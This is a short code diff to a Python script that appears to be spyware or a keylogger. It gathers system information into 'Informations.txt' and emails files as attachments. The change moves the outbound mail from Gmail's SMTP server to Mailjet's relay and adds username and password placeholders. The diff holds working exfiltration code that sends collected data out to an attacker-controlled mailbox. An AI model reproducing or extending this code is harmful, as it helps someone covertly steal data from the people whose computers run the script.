@@ -8,8 +8,12 @@ from email.mime.text import MIMEText
 import glob
 
 system_information = "Informations.txt"
+
+# TEMP MAIL
 email_address = "YOUR MAIL"
-password = "YOUR PASSWORD"
+username = "YOUR USERNAME (MD5)"
+password= "YOUR PASSWORD (MD5)"
+
 file_path = os.getcwd()
 
 
@@ -33,9 +37,9 @@ def send_email(filename, attachment):
     p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
     msg.attach(p)
 
-    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s = smtplib.SMTP('in-v3.mailjet.com', 587)
     s.starttls()
-    s.login(fromaddr, password)
+    s.login(username, password)
     text = msg.as_string()
     s.sendmail(fromaddr, toaddr, text)
     s.quit()
